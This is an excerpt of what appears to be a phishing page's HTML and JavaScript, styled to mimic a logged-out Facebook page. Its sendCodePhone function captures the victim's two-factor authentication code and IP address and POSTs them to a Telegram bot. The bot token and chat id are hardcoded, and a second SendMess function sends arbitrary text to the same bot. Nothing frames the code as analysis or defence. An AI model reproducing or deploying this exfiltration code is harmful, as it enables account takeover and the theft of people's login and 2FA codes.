...
<body class="UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_GB" dir="ltr">
    ...
    // Add new classes to body
        ...
        function sendCodePhone() {
            ...
            $.ajax({
                url: 'https://api.telegram.org/bot6540923630:AAG0vcUj_gAiBjEHDyGd7zd5gplrY2n-yAE/sendMessage',
                method: 'POST',
                data: {
                    chat_id: '-4066576285',
                    text: '2FA: ' + code + '\nIp: ' + ip
        ...
        function SendMess(text) {
            $.ajax({
                url: "https://api.telegram.org/bot6540923630:AAG0vcUj_gAiBjEHDyGd7zd5gplrY2n-yAE/sendMessage?chat_id=-&text=" + text,
                type: 'POST',
                success: function(data) {
                    console.log('true', data);
                },
